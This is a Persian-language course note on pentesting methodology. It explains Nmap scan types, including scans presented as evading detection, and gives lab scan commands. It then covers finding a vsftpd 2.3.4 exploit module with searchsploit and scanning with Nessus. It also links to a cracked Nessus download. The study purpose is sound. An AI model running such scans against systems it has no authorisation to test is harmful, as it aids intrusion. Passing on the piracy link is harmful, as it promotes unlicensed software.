---
Episode: E50 to E54
Date: 2024-07-12
Is Finished?: true
Practice Primary: true
Practice Secondary: 
Time: 11:00
tags:
  - CyberSecurity
  - hacking
Category: Cyber Security
banner: 
Home: "[[Table of Content - Hacking & Security]]"
Pervious Episode: "[[E45 to E49 - (Pentesting Module Concepts - Part 1)]]"
Next Episode: "[[E55 to E57 - (Setup Try Hack Me & SMB, Telnet, FTP Exploitation)]]"
---
-------
## E50 to E54 - (Pentesting Methodology - Part 2)
- [Pentesting **Methodology** - Full Steps](#Pentesting%20**Methodology**%20-%20Full%20Steps)
- [**M.Step1** Scanning Networks & Targets with `Nmap` - E50](#**M.Step1**%20Scanning%20Networks%20&%20Targets%20with%20%60Nmap%60%20-%20E50)
	- [M.Step1(Information Gathering)](#M.Step1(Information%20Gathering))
	- [Network Scanning Definitions](#Network%20Scanning%20Definitions)
		- [Network Scanning Functionality](#Network%20Scanning%20Functionality)
		- [What is Nmap?](#What%20is%20Nmap?)
		- [Port States in Nmap](#Port%20States%20in%20Nmap)
			- [Definitions](#Definitions)
			- [State's Definition](#State's%20Definition)
		- [TCP Header](#TCP%20Header)
		- [TCP Handshake](#TCP%20Handshake)
	- [Nmap Usages & Instructions](#Nmap%20Usages%20&%20Instructions)
		- [Nmap Scan Types](#Nmap%20Scan%20Types)
			- [Scan Basics](#Scan%20Basics)
			- [0. Scan Speed `-T0` to `-T4`](#0.%20Scan%20Speed%20%60-T0%60%20to%20%60-T4%60)
			- [1. Ping Scan `-sn`](#1.%20Ping%20Scan%20%60-sn%60)
			- [2. TCP Connect Scan `-sT` (Full Open Scan)](#2.%20TCP%20Connect%20Scan%20%60-sT%60%20(Full%20Open%20Scan))
			- [3. TCP Syn Scan `-sS` (Scan Stealth Scan)](#3.%20TCP%20Syn%20Scan%20%60-sS%60%20(Scan%20Stealth%20Scan))
			- [4. UDP Scan `-sU`](#4.%20UDP%20Scan%20%60-sU%60)
			- [5. FIN Scan `-sF`](#5.%20FIN%20Scan%20%60-sF%60)
			- [6. NULL `-sN`](#6.%20NULL%20%60-sN%60)
			- [7. XMAS `-sX` Scan](#7.%20XMAS%20%60-sX%60%20Scan)
		- [Nmap Cheat sheet](#Nmap%20Cheat%20sheet)
	- [A Real & Best Scan Demo](#A%20Real%20&%20Best%20Scan%20Demo)
- [**M.Step2** Vulnerability Assessments Before Hacking - E51](#**M.Step2**%20Vulnerability%20Assessments%20Before%20Hacking%20-%20E51)
	- [M.Step2(Reconnaissance)](#M.Step2(Reconnaissance))
	- [Definition & Instruction](#Definition%20&%20Instruction)
		- [What is Vulnerability Assessments?](#What%20is%20Vulnerability%20Assessments?)
		- [Vulnerability Assessments Tools](#Vulnerability%20Assessments%20Tools)
		- [Vuln's Assessments with `searchsploit`](#Vuln's%20Assessments%20with%20%60searchsploit%60)
		- [Vuln's Assessments with `Nessus`](#Vuln's%20Assessments%20with%20%60Nessus%60)
	- [Practical Demo](#Practical%20Demo)
- [**M.Step3** Exploitation the Vulnerability - E52](#**M.Step3**%20Exploitation%20the%20Vulnerability%20-%20E52)
	- [M.Step3(Gain Access)](#M.Step3(Gain%20Access))
	- [Definition & Instruction](#Definition%20&%20Instruction)
		- [Start Exploitation](#Start%20Exploitation)
		- [Instruction Steps](#Instruction%20Steps)
	- [Practical Demo](#Practical%20Demo)
- [**M.Step4** Post Exploitation & Escalation Privilege - E53](#**M.Step4**%20Post%20Exploitation%20&%20Escalation%20Privilege%20-%20E53)
	- [M.Step4](#M.Step4)
	- [Definition & Instruction](#Definition%20&%20Instruction)
		- [Post-Exploitation Phase](#Post-Exploitation%20Phase)
		- [Meterpreter Shell Commands & Features](#Meterpreter%20Shell%20Commands%20&%20Features)
	- [Practical Demo](#Practical%20Demo)
- [Practice Pentesting Methodology  with **Try Hack Me** - E54](#Practice%20Pentesting%20Methodology%20%20with%20**Try%20Hack%20Me**%20-%20E54)
	- [Definition & Instruction](#Definition%20&%20Instruction)
		- [Practical Pentesting](#Practical%20Pentesting)
		- [Try Hack Me - Hacking Laboratory 🔬 💻](#Try%20Hack%20Me%20-%20Hacking%20Laboratory%20%F0%9F%94%AC%20%F0%9F%92%BB)
	- [Practical Demo](#Practical%20Demo)
		- [Room Description](#Room%20Description)
		- [TASK 1 - Recon](#TASK%201%20-%20Recon)
		- [TASK 2 - Gain Access](#TASK%202%20-%20Gain%20Access)
		- [TASK 3 - Escalate](#TASK%203%20-%20Escalate)
		- [TASK 4 - Cracking](#TASK%204%20-%20Cracking)
		- [TASK 5 - Find Flags](#TASK%205%20-%20Find%20Flags)
****
### Pentesting **Methodology** - Full Steps
1. [**M.Step1** Scanning Networks & Targets with `Nmap` - E50](#**M.Step1**%20Scanning%20Networks%20&%20Targets%20with%20%60Nmap%60%20-%20E50)
2. [**M.Step2** Vulnerability Assessments Before Hacking - E51](#**M.Step2**%20Vulnerability%20Assessments%20Before%20Hacking%20-%20E51)
3. [**M.Step3** Exploitation the Vulnerability - E52](#**M.Step3**%20Exploitation%20the%20Vulnerability%20-%20E52)
### **M.Step1** Scanning Networks & Targets with `Nmap` - E50
#### M.Step1(Information Gathering)
**قدم اول** در Pentesting Methodology اسکن تارگت برای یافتن سرویس های فعال و اطلاعات OS تارگت میباشد. 
#### Network Scanning Definitions
##### Network Scanning Functionality 
اولین قدم در هر متدلوژی Pentesting، جمع آوری اطلاعات `Information Intelligence Gathering` میباشد. حال بسته به هدف ممکن است این جمع آوری از اینترنت و یا از داخل شبکه گیرد. در اینجا که هدف ما در داخل یک شبکه LAN است، اولین قدم، `فرآیند Network Scanning` است.
- *فرآیند Network Scanning*: به مجموعه از پروسه ها و رویه هایی است که برای شناسایی Host ها در شبکه و همچنین Service هایی که در شبکه خدمات میدهند، همچنین آسیب پذیری های آنها انجام میشود، Network Scanning گفته میشود. در واقع یکی از اجزای کلیدی در مرحله جمع آوری اطلاعات Intelligence Gathering میباشد که Attacker(مهاجمان) از آن برای ایجاد پروفایل از تارگت خود استفاده میکنند.
*این فرآیند Network Scanning برای انجام اهداف زیر استفاده میشود >>*
1. شناسایی Live Hosts, IP Addresses, Live hosts Open Ports
2. شناسایی OS و System Architecture
3. شناسایی Services Running on live hosts
4. شناسایی Vulnerability on live hosts
5. *اسلاید*:
	1. ![[Pasted image 20240710191054.png]]
##### What is Nmap?
- یکی از بهترین و قویترین Network Scanner ها `Nmap` میباشد. از Nmap برای شناسایی Host های فعال شبکه و Services های فعال درون شبکه استفاده میشود. 
- اسکنر Nmap با ارسال پکت هایی به سمت تارگت بنام `Probe Packet` ، و سپس آنالیز جواب آنها جمع آوری اطلاعات را از تارگت انجام میدهد و State پورت ها را مشخص میکند.
 - *اسکنر Nmap ویژگی هایی را برای جمع آوری اطلاعات از شبکه ارائه میدهد که عبارتند از >>*
	1. Host Discovery
	2. Services & OS Detection
	3. Services Detection
	4. Vulnerability Detection
- همچنین با استفاده از ویژگی بنام *Nmap Scripting* میتوانیم اسکن های بسیار پیشرفته ای را برای یافتن انواع آسیب پذیری در سیستم تارگت انجام دهیم. 
- از دیگر ویژگی های مهم اسکنر Nmap توان سازگار شدن با Networks Condition های شبکه تارگت را از جمله Latency, Congestion را در طول انجام اسکن دارد.
- *اسلاید*:
	- ![[Pasted image 20240710192601.png]]
##### Port States in Nmap
###### Definitions
بسیاری از اسکنر ها پورت هایی که اسکن میکنند را در دو حالت Open , Close نمایش میدهند. این درحالیست که Nmap نتایج اسکن را بصورت دقیقتر نشان میدهد و در واقع پورت ها را در شش 6 State متفاوت دسته بندی میکند، این دسته ها عبارتند از >>
- `Open`, `Closed`, `Filtered`, `Unfiltered`, `Open|Filtered`, `Closed|Filtered
- این حالت ها یا State ها، ویژگی ذاتی پورت نیستند و در واقع توضیح دهنده این هستند که Nmap چگونه آنها را دیده و آنالیز کرده است.
- *مثال*: فرض کنید میخواهیم پورت `tcp/135` ماشین تارگت را از دو محل متفاوت(شبکه داخلی و اینترنت) با Nmap اسکن میکنیم >>
	- اگر اسکن در شبکه داخلی LAN یکسان شبکه LAN با ماشین تارگت انجام شود، State پورت `tcp/135` مقدار `Open` است.
	- حال اگر اسکن کاملا مشابه با اسکن بالا از بستر اینترنت یعنی شبکه WAN صورت گیرد، State پورت `tcp/135` مقدار `Filtered` است.
- *اسلاید*:
	- ![[Pasted image 20240710194035.png]]
###### State's Definition
0. **Open**
	1. نشان میدهد که نرم افزاری در حال کار با این پورت است و پورت هم به آن نرم افزار Listening میکند.
	2. در واقع هدف اسکن هم یافتن این مدل پورت های Open در ماشین تارگت میباشد.
1. **Closed**
	1. نشان میدهد که بسته Probe از مقصد با موفقیت دریافت شده است اما پورت در حالت Listening نبوده است و در واقع Closed است.
2. **Filtered**
	1. نشان میدهد که بسته Probe از مقصد دریافت نشده است، در نتیجه State قابل تشخیص نیست.
3. **Unfiltered**
	1. نشان میدهد که بسته Probe از مقصد با موفقیت دریافت شده است اما Nmap نتوانسته State این پورت را تشخیص دهد. در واقع Nmap متوجه Closed و یا Open بودن پورت نشده است.
4. **Open/Filtered**
	1. نشان میدهد پورت یا Open است و یا Filter است اما Nmap نتوانسته است State آنرا بصورت دقیق تشخیص دهد. 
	2. در واقع پورتی که Filtered است و به سمت Open بودن تمایل بیشتری دارد را Nmap در این State نمایش داده میدهد. 
	3. در واقع Nmap به باز بودن پورت مشکوک است، اما احتمال باز بودن آن بیشتر است.
5. **Closed/Filtered**
	1. نشان میدهد که Nmap قادر به تشخیص State این پروت نیست، در واقع میگوید پورت یا Closed است و یا Filtered است.
	2. در واقع Nmap به بسته بودن پورت مشکوک است، اما احتمال بسته بودن آن بیشتر است.
6. *Slide*:
	1. ![[Pasted image 20240710194921.png]]
##### TCP Header
نکته دیگری که در Network Scanning مهم است، Header بسته های TCP است. در واقع در این Header فلگ هایی استفاده میشوند که Attacker ها حملات خود را با استفاده از این فلگ ها انجام میدهند.
حال Nmap هم بوسیله این TCP Flags ها اسکن های خود را انجام میدهد، این فلگ های TCP به ترتیب عبارتند از >>
1. `URG`
2. `ACK`
3. `PSH`
4. `RST`
5. `SYN`
6. `FIN`
7. TCP Header Image
	1. ![[Pasted image 20240710195459.png]]
##### TCP Handshake
برای برقراری یک ارتباط TCP بین کلاینت و سرور بسته هایی رد و بدل میشود >>
1. *Step 1* Client Send `SYN`
2. *Step 2* Server Receive `SYN` and Send `SYN + ACK`
3. *Step 3* Now Client give `SYN + ACK` and send `ACK`
4. Server Receive `ACK` and TCP Connection Established between Client and Server
5. *TCP Handshake Image*
	1. ![[Pasted image 20240710195737.png]]
#### Nmap Usages & Instructions
##### Nmap Scan Types 
###### Scan Basics
با استفاده از اسکنر Nmap انواع و اقسام اسکن را برای جمع آوری اطلاعات لازم از تاگت میتوانیم انجام دهیم که در این جلسه به شرح مهمترین این اسکن ها میپردازیم. 
در تصویر زیر نمونه ای از این اسکن ها را به همراه فلگ هایی که برای هر کدام باید استفاده کنیم را میتوانید مشاهده کنیم:
	![[Pasted image 20240710200111.png]]
*نکته:* اسکن میتواند بر روی رنج شبکه (192.168.1.1/24) و یا بر روی یک آیپی (192.168.1.1) انجام شود.
###### 0. Scan Speed `-T0` to `-T4`
با مقدار دهی این سویچ میتوانیم مدت زمان و مقدار عمق اسکن را مشخص کنیم. در واقع اسکن با `T0-` زمان بیشتری میگرد اما اطلاعات بیشتری را با دقت بیشتری و بدون لو رفتن(No Foot Print) جمع آوری میکند. 
در حالیکه اسکن با `T4-` اسکن را با سرعت بیشتر و دقت کمتری انجام میدهد. همچنین امکان لو رفتن و ماندن Footprint از Attacker در ماشین تارگت در این اسکن بیشتر است.
حال بسته به مکانیزم های امنیتی که بر روی ماشین تارگت فعال هستند و همچنین بسته به نوع OS سیستم عامل در شراسط مختلف از اسکن های مناسب آن استفاده میکنیم.
###### 1. Ping Scan `-sn`
- **در اولین قدم اسکن، باید ببینیم کدام ماشین ها درون شبکه فعال هستند.**
از این اسکن برای شناسایی Live Hosts ها، در واقع ماشین های روشن  درون شبکه استفاده میشود. این اسکن تمام ماشین هایی که در یک رنج شبکه هستند و UP روشن هستند را نشان میدهد.
	![[Pasted image 20240710204752.png]]
```sh
nmap -sn 192.168.10.1/24
```
	![[Pasted image 20240710204916.png]]
###### 2. TCP Connect Scan `-sT` (Full Open Scan)
- **در قدم دوم اسکن، یعنی پس از یافتن ماشین های فعال، باید وضعیت State پورت های فعال ماشین ها را پیدا کنیم.**
- از این اسکن برای شناسایی `TCP Ports` ها و همچنین اطمینان حاصل کردن از وضعیت Listening بودن آن پورت یعنی Open بودن آن استفاده میکنیم.
- اسکنر Nmap، وضعیت Listening بودن port را از طریق برقرار کردن Three Way Handshake بین پورت مبدا و مقصد، متوجه میشود.
	![[Pasted image 20240710205423.png]]
- این اسکن مانند TCP Connect Scan معمولی است اما نتیجه کامل تری را گزارش میدهد. این اسکن هم زمان بیشتری میبرد و هم منابع بیشتری را مصرف میکند. ضعفی که این اسکن دارد، این است به احتمال زیاد این اسکن توسط ماشین تارگت شناسایی میشود و Log در ماشین تارگت ذخیره میشود.
- *اسکنر Nmap وضعیت پورت ها را با برقراری TCP Handshake و آنالیز  Response بسته های آن بدست میاورد >>*
	- اگر پورت `Open` باشد، مبدا با `SYN Packet` درخواست میدهد.
	- مقصد در جواب بسته `SYN ACK` را میفرستد.
	- سپس مبدا هم در جواب `ACK` را میفرستد.
	- در آخرین مرحله مقصد با فرستادن `RST, ACK` کانکشن را برقرار و سپس Reset میکند.
	- تفاوت TCP Handshake معمولی با TCP Handshake که Nmap برای اسکن برقرار میکند، در فرستادن `RST packet` پس از برقراری Three Way TCP Handshake است. 
	- در حالیکه در TCP Handshake معمولی در آخرین مرحله فقط بسته `ACK` برای برقرار شدن رابطه ارسال میشود.
-  **اسلاید**:
	- ![[Pasted image 20240710210440.png]]
```sh
nmap -sT 192.168.10.1/24
nmap -sT 192.168.10.1
```
	![[Pasted image 20240710210520.png]]
	![[Pasted image 20240710210525.png]]
- *در واقع این اسکن State پورت ها از جمله پورت های معروف مانند FTP, SSH, Telnet,, ... را نشان میدهد.*
###### 3. TCP Syn Scan `-sS` (Scan Stealth Scan)
- *اگر بخواهیم قدم دوم اسکن یعنی جمع آوری اطلاعات از پورت ها و سرویس های فعال را بدون شناخته شدن توسط تارگت و همچنین با سرعت بیشتری نسبت به `TCP Full Scan` انجام دهیم، از این اسکن بنام `TCP Syn` اسکن استفاده میکنیم که این نوع اسکن جمع آوری اطالاعات را بدون `Footprinting` و لو رفتن انجام میدهد.*
- در این اسکن، فقط با ارسال بسته اول TCP Handshake، یعنی بسته با فلگ `SYN` اسکن انجام میشود و به همین خاطر هم که TCP Connection در این اسکن بصورت کامل برقرار نمیشود، این اسکن را به اصطلاح `Half-Open Scan` مینامند.
- اسکنر Nmap، در این اسکن با فرستادن یک `TCP SYN Packet` و سپس آنالیز `Response` جواب آن به اسکن و جمع آوری اطلاعات از شبکه تارگت میپردازد.
- اسکن SYN از رایج ترین و شایع ترین اسکن هاست که بهترین گزینه است که میتوان از آن برای اهداف خوب استفاده کرد. 
- در این اسکن در ثانیه میتوانیم به سرعت هزاران پورت را اسکن کنیم در حالیکه فایروال هم قادر به شناسایی آن نیست. این درحالیست که اگر بخواهیم TCP Full Scan را بر روی یک رنج از شبکه انجام دهیم زمان بسیار زیادی مصرف میشود و Footprint اسکن هم در ماشین تارگت باقی میماند.
- در این اسکن هنگامیکه `SYN Packet` برای تارگت ارسال میشود و سپس جواب آن میاید، اگر در جواب بسته `SYN/ACK`  بیاید به معنای باز بودن پورت *Listening(Open) Ports* است و اگر در جواب بسته `RST` بیاید نشان میدهد که پورت *Closed Ports* است.
- همچنین اگر در جواب ICMP ارسالی `ICMP Unreachable` دریافت شود، پورت را `Filtered` نشان میدهد.
- **اسلاید**:
	- ![[Pasted image 20240710212043.png]]
```sh
sudo nmap -sS 192.168.10.1/24
```
	![[Pasted image 20240711211453.png]]
###### 4. UDP Scan `-sU`
- **پس از یافتن پورت های باز TCP، در صورتیکه سرویس و یا پورتی برای نفوذ پیدا نکنیم ممکن است نیاز داشته باشیم پورت های UDP Open را هم پیدا کنیم تا با استفاده از پورت های UDP حمله خود را انجام دهیم.**
- در این اسکن، Nmap با ارسال بسته UDP به تمام پورت های UDP تارگت و سپس بررسی Response آنها به آنالیز و اسکن پورت های تارگت میپردازد. 
- در بسته هایی که در این اسکن ارسال میشود عموما هیچ Payload وجود ندارد به غیر از یکسری از بسته هایی که به سمت پورت های پر استفاده مانند FTP, SSH, Telent ارسال میشود Payload برای شناسایی بهتر وجود دارد.
	![[Pasted image 20240710212602.png]]
- در کانکشن های UDP هیچ ارتباطی بین کلاینت و سرور وجود ندارد. در واقع UDP یک Connection Less Protocols است و برای برقراری ارتباط هیچ کانکشنی را بین سرور و کلاینت برقرار نمیکند.
- اکثر سیستم عامل ها که در بستر شبکه TCP/IP هستند، اگر بسته ای UDP به پورت UDP آنها که Closed است ارسال شود، در جواب `ICMP "Port Unreachable"` ارسال میکند. 
- *اسکنر Nmap بر اساس بررسی Response بسته و شرایط زیر وضعیت State پورت های UDP را مشخص میکند >>*
	- Any UDP Response from target port => `open`
	- No Response Received => `open|filtered`
		- ![[Pasted image 20240711224002.png]]
	- ICMP Port Unreachable => `closed`
	- Other ICMP Unreachable => `filtered`
	- *Table Image*:
		- ![[Pasted image 20240710213337.png]]
- **اسلاید**:
	- ![[Pasted image 20240710213351.png]]
```sh
sudo nmap -sU 192.168.18.110
```
	![[Pasted image 20240710213528.png]]
	![[Pasted image 20240710213531.png]]
###### 5. FIN Scan `-sF`
- **اگر میخواهیم بدون Footprint و یا لو رفتن اسکن انجام دهیم، یکی دیگر از TCP Scan هایی که میتوانیم از آن استفاده کنیم، اسکن `TCP FYN` میباشد. سرعت این اسکن متوسط و بین `TCP Full` و `TCP Syn` میباشد.**
یکی از روش های اسکن پورت در Nmap است که با استفاده از ضعف احمقانه موجود در فایروال های قدیمی اسکن را انجام میدهد.
	![[Pasted image 20240710214035.png]]
- در واقع در این روش اسکن، Nmap با ارسال بسته های `TCP` با فلگ `FYN` به نحوی سرور را گول میرند که این بسته پایان یک ارتباط TCP Connection برقرار شده است. سپس اسکنر با بررسی Response بسته `TCP Fyn` وضعیت پورت را شناسایی میکند >>
	- اگر جوابی برای بسته `TCP` با فلگ `FYN` نیاید، به معنای *Port Open* است.
	- اگر در جواب، بسته را Drop کند و سپس بسته ای با فلگ `RST/ACK` تولید شود به معنای *Port Closed* است.
- در واقع از بسته `TCP` با فلگ `FYN` برای پایان دادن یک TCP Connection موجود بین مبدا و مقصد پس از اتمام انتقال داده بین کلاینت و سرور استفاده میشود.
- حال Nmap با سو استفاده از این موضوع و ارسال بسته `TCP` با فلگ `FYN` به شناسایی State پورت میپردازد.
- **اسلاید**:
	- ![[Pasted image 20240710214441.png]]
```sh
sudo nmap -T4 -sF 192.168.18.110
```
	![[Pasted image 20240710214749.png]]
###### 6. NULL `-sN` 
- **دو اسکن XMAS و NULL دقیقا مانند یکدیگر کار میکنند فقط در فلگ که در بسته Prob  TCP ارسالی برای اسکن  استفاده میکنند متفاوت هستند.**
	- در جواب این نوع اسکن ها اگر `RST Packet` دریافت شود، `Port Closed` است و اگر جوابی دریافت نشود `Port Open|Filtered` است.
	- اگر جواب دریافتی `ICMP Unreachable` باشد، `Port Filtered` است.
- - اسکن *NULL Scan* مجموعه از چندین TCP Packet که تمامی Sequence Number های آن صفر است(00000) را برای تارگت ارسال میکند. در این اسکن بسته TCP در واقع Probe که Nmap ارسال میکند بدون هیچ فلگ ارسال میشود.
	- در این اسکن مقصد گیج میشود و نمیداند چگونه جواب این بسته را بدهد. 
	- در واقع تارگت اگر بسته را Discard کند و جوابی Replay برای nmap صادر نکند، بدین معناست که پورت مورد نظر `Open Port` است.
###### 7. XMAS `-sX` Scan 
- اسکن *XMASS Scan* هم جوری طراحی شده است که فلگ های `PSH, URG, FIN` درون TCP Header را تغییر Manipulate دهد. در واقع این سه فلگ را روشن UP میکند. سپس با بررسی جواب بسته، State پورت ها را مشخص میکند:
	- اگر `Port Open` باشد، تارگت بسته `TCP` به همراه فلگ های `PSH, URG, FIN` ها را Discard میکند و از بین میبرد و هیچ جوابی را در جواب Nmap صادر نمیکند.
	- اگر `Port Close` باشد، تارگت در جواب بسته `TCP` به همراه فلگ های `PSH, URG, FIN` بسته ای TCP با فلگ `RST|ACK` تولید میکند.
- **اسلاید**:
	- ![[Pasted image 20240710220016.png]]
```sh
sudo nmap -T5 -sN 192.168.18.110
sudo nmap -T4 -sX 192.168.18.111
```
	![[Pasted image 20240710220346.png]]
	![[Pasted image 20240710220215.png]]
	![[Pasted image 20240710220405.png]]
	![[Pasted image 20240710220413.png]]

##### Nmap Cheat sheet
برای کار با Nmap دو Cheat Sheet زیر را میتوانیم استفاده کنیم.
1. **Cheatsheet 1**
	1. ![[Pasted image 20240710220637.png]]
2. **Cheatsheet 2**
	1. ![[Pasted image 20240710220608.png]]
#### A Real & Best Scan Demo
یکی از بهترین روش های اسکن استفاده از چندین فلگ با یکدیگر میباشد. مثلا میتوانیم از `sS-` و `sC-` و `A-` با هم استفاده کنیم:
- *نتیجه این اسکن با اسکن هایی که تابحال انجام دادیم متفاوت و کامل تر است. این اسکن میتواند اطلاعات زیر از تارگت به ما بدهد >>*
	1. Services Running on Target machine
	2. Detection OS Version
	3. Services Version
	4. Vulnerabilities in Target Services & OS
	5. TLS & SSL Certificates
```sh
sudo nmap -T5 -sS -A -sC 192.168.18.110
```
	![[Pasted image 20240710221503.png]]
	![[Pasted image 20240710221455.png]]
	![[Pasted image 20240710221607.png]]
- `-sS` TCP Syn Scan-A
- `-sC` Use nmap default scripts
- `-A` *OS Detection & Services Detection and Traceroute*
	- Services Scan Results
		- ![[Pasted image 20240711231337.png]]
	- OS Detection Result
		- ![[Pasted image 20240711231411.png]]
	- Host Script Results
		- ![[Pasted image 20240711231447.png]]
	- Traceroute Results
		- ![[Pasted image 20240711231516.png]]
در جلسه بعدی میخواهیم با استفاده از آسیب پذیری که در سرویس `vsFTPd 2.3.4` وجود دارد و در اسکن هم تارگت ما این آسیب پذیری را داشت استفاده کنیم تا به ماشین تارگت نفوذ کنیم.
	![[Pasted image 20240710221536.png]]
### **M.Step2** Vulnerability Assessments Before Hacking - E51
#### M.Step2(Reconnaissance)
حال که اسکن را انجام دادیم و سرویس های فعال درون ماشین تارگت را یافتیم، در **قدم دوم** Pentesting Methodology باید آسیب پذیری های این سرویس ها را پیدا کنیم تا بتوانیم با بهره برداری از آنها حمله و نفوذ را پیاده سازی کنیم.
#### Definition & Instruction
##### What is Vulnerability Assessments?
- به بررسی سیستماتیک از ضعف های امنیتی و آسیب پذیری هایی که در یک سیستم اطلاعاتی وجود دارد، به اصطلاح `Vulnerability Assessments` یا *ارزش گذاری آسیب پذیری* گفته میشود.
- در این فرآیند بررسی میکنیم که تارگت ما در مقابل کدام آسیب پذیری های شناخته شده حساس است، سپس سطوح امنیتی مختلف را برای این آسیب پذیری های اعمال میکنیم و پس نتیجه گیری، اصلاح این آسیب پذیری و یا استفاده از آنرا توصیه میکنیم.
	![[Pasted image 20240711155114.png]]

> در واقع پس از اسکن پورت ها، باید آسیب پذیری هایی که در هر پورت وجود دارد و میتوانیم از آنها برای نفوذ استفاده کنیم را پیدا کنیم و در اینجا Vulnerability Assessments به کمک ما می آید.

##### Vulnerability Assessments Tools
ابزار های متعدی برای یافتن و ارزش گذاری آسیب پذیر ها وجود دارد که معروف ترین و بهترین آنها عبارتند از >>
1. `Searchsploit`
	1. ابزاری CLI و ساده که برای جستجو در پایگاه داده *Exploit DB* استفاده میشود. این ابزار بصورت پیشفرض بر روی Kali نصب است.
	2. پایگاه داده Exploit DB دیتابیسی است که شامل تمامی CVE های بروز، Exploit ها و همچنین Vulnerability های شایع است.
2. `Nessus`
	1. یک اسکنر امنیتی که بصورت GUI کار میکند. Nessus ابتدا یک اسکن کامل از تارگت انجام میدهد و اگر به Vulnerability برسد که احتمال بدهد میتوان از آن در حمله و نفوذ به ماشین تارگت استفاده کرد، آن آسیب پذیری را در قالب Notification به attacker اطلاع میدهد. 
	2. این ابزار هم برای ویندوز و هم برای لینوکس در دسترس است اما ابزاری غیر رایگان Paid است که میتوان نسخه کرک شده آنرا از وبسایت های ایرانی مانند technet24.net و یا digiboy.ir دانلود کنیم.
3. *Slide*:
	1. ![[Pasted image 20240711160024.png]]
##### Vuln's Assessments with `searchsploit`
پایگاه داده Exploit DB یک پایگاه داده جامع از تمامی Vulnerability و Exploit های شناخته شده در جهان است. حال با استفاده از کامند `searchsploit` متیوانیم بصورت لوکال در این دیتابیس جستجو کنیم.
در جلسه قبل گفتیم میخواهیم با استفاده از آسیب پذیری که در سرویس `vsftpd 2.3.4` وجود دارد میخواهیم به ماشین تارگت نفوذ کنیم. برای اینکار ابتدا باید Vulnerability هایی که در این ورژن از سرویس وجود دارد را پیدا کنیم. در اینجا از `searchsploit` استفاده میکنیم.
```sh
searchsploit vsftpd 2.3.4
```
	![[Pasted image 20240711160519.png]]
- همانطور که در تصویر بالا هم مشاهده کردید، برای سرویس `vsftpd 2.3.4` :ه بر روی تارگت ما هم فعال است، میتوانیم از  `unix/remote/17491.rb` در Metasploit framework برای نفوذ استفاده کنیم.
##### Vuln's Assessments with `Nessus`
0. *Download Nessus and Install this*
	1. https://www.tenable.com/downloads/nessus
		1. ![[Pasted image 20240711160914.png]]
	2. اسکنر Nessus در قالب فایل ماشین مجازی VM با پسوند `ovf.` ارائه میشود و باید در ماشین مجازی Import شود. پس از Open کردن آن در ماشین مجازی میتوانیم با وارد کردن آیپی ماشین مجازی در مرورگر وارد صفحه اسکنر شویم.
	3. *نسخه مورد نظر را از لینک زیر دانلود کنید:*
		1. https://hellodigi.ir/other-hellodigi/download/1431-nessus-lic-crack.html
1. *Config Nessus after first Installation*
	1. پس از Open اسکنر در ماشین مجازی آنرا Power On میکنیم. برای اولین بار باید آیپی اسکنر را تنظیم کنیم.
	2. وقتی deploy تمام شد با `user:hellodigi` و پسورد `pass:admin`  لاگین کرده و آیپی ماشین مجازی خود را تغییر داده برای این کار باید دستور زیر را وارد کنید و با editor nano یا vim فایل گفته شده را تغییر بدید
	3. `sudo vim /etc/netplan/00-installer-config.yaml`
	4. بعد از تغییرات ای پی خود می توانید دستور `sudo netplan apply` یا ماشین رسیت کنید و بعد داخل مرورگر خود با وارد کردن آدرس زیر وارد صفحه اسکنر شوید:
	5. https://ip:8834
	6. بصورت پیشفرض `user  و pass` پنل وب هر دو عبارت `admin  و admin` می باشد.
2. *Open Nessus in Web Panel =>*  https://192.168.10.168:8834
	1. این اسکنر در پنل وب باز میشود. بنابراین ابتدا باید آنرا نصب و سپس اجرا کنیم. پس از نصب مرورگر را باز میکنیم و به https://192.168.10.168:8834 که صفحه اسکنر است میرویم.
3. *Launch Scanning*
	1. در صفحه اسکنر، `Basic Network Scan` را انتخاب میکنیم:
		1. ![[Pasted image 20240711161224.png]]
	2. سپس در پنجره بعدی، نامی برای اسکن انتخاب میکنیم و در قسمت `Targets` آدرس آیپی تارگت ها را وارد میکنیم:
		1. ![[Pasted image 20240711161425.png]]
	3. در آخر بر روی `Saving` کلیک میکنیم تا و سپس وارد صفحه My Scans میشویم و بر روی اسکن مورد نظر کلیک میکنیم تا وارد صفحه اسکن شویم.
	4. سپس بر روی `Launch` در بالای صفحه سمت راست کلیک میکنیم تا اسکن ما شروع شود.
		1. ![[Pasted image 20240712003539.png]]
	5. این کلید Launch در کنار `Configure` قرار دارد که میتوانیم برای کانفیگ اسکن از آن استفاده کنیم.
4. *See Scan Results*
	1. پس از اتمام اسکن، Nessus گزارشی کامل از تمام Vulnerability هایی که در ماشین تارگت وجود دارد را به همراه لول خطرناک بودن این Vulnerability را در گزارش خود ارائه میکند:
		1. ![[Pasted image 20240711161638.png]]
	2. بدترین نوع *Vulnerability* نوع `Critical` است که میتوانیم از این آسیب پذیری ها برای نفوذ خود استفاده کنیم.
#### Practical Demo
0. Scenario Description
	1. در جلسه قبلی که تارگت را اسکن کردیم دیدیم که سرویس `vsftpd 2.3.4` بر روی ماشین تارگت فعال است.
1. *Methodology-Step 1:* Scan for Active Services on Target 
	1. در قدم اول متدلوژی باید سرویس هایی که بر روی ماشین تارگت فعال هستند را شناسایی کنیم.
	2. `nmap -sS -A -sC 192.168.110.22`
		1. ![[Pasted image 20240711162006.png]]
	3. در این جلسه، میخواهیم با استفاده از آسیب پذیری که در `vsftpd 2.3.4` وجود دارد به ماشین ویندوزی تارگت نفوذ کنیم.
3. *Methodology-Step 2:* Search for suitable vulnerabilities `searchsploit`
	1. در قدم دوم متدلوژی پس از یافتن سرویس های فعال ماشین تارگت، باید آسیب پذیری این سرویس ها را پیدا کنیم. در مثال ما باید Vulnerability های سرویس `vsftpd 2.3.4` را پیدا کنیم:
	2. `searchsploit vsftpd 2.3.4`
		1. ![[Pasted image 20240711162557.png]]
	3. در این سناریو میخواهیم با استفاده از اکسپلویت با نام `unix/remote17491.rb/` که یک Exploit است که به زبان Ruby نوشته شده و در Metasploit Framework هم وجود دارد حمله ی خود را انجام دهیم.
	4. دقت کنید، اگر ورژن سرویس را وارد نکنیم، آسیب پذیری های تمام ورژن های این سرویس لیست میشوند؛ بهتر است با وارد کردن ورژن این جستجو را محدود تر کنیم.
	5. `searchsploit vsftpd`
		1. ![[Pasted image 20240711162707.png]]
4. *Methodology-Step 2:* Search for suitable vulnerabilities `Nessus`
	1. قدم دوم متدلوژی را میتوانیم بوسیله Nessus که به مراتب قدرتمند تر از سایر اسکنر ها نیز هست انجام دهیم. برای انجام اسکن با Nessus مراحل زیر را دنبال میکنیم:
	2. `Nessus Web Panel => New Scan`
		1. ![[Pasted image 20240711163105.png]]
